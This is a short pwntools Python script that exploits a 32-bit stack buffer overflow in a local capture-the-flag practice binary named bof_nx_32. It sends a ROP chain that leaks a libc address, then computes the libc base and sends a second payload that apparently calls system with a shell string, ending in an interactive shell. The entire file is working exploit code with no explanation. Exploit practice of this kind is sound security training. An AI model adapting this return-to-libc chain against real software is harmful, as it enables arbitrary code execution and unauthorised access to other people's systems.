from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/3_bof_nx_32/bof_nx_32")
pwn.gdb.attach(p)
p.recvuntil(b'\n')
p.recvuntil(b'\n')
payload = b"\x00" * 32
payload += p32(0x8049070) + p32(0x8049343) + p32(0x804c01c) + p32(0x8049060) + p32(0x8049343) + p32(0x804c880) + p32(0x8049343) + p32(0x804c87c) + p32(0x8049125)
payload += b"\n"
p.send(payload)
libc_base = u32(p.recv()[0:4].ljust(4,b'\x00')) + -0x18eb0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p32(libc_base + 0x3d3d0) + p32(0x0) + p32(libc_base + 0x17e1db)
payload += b"\n"
p.send(payload)
p.interactive()
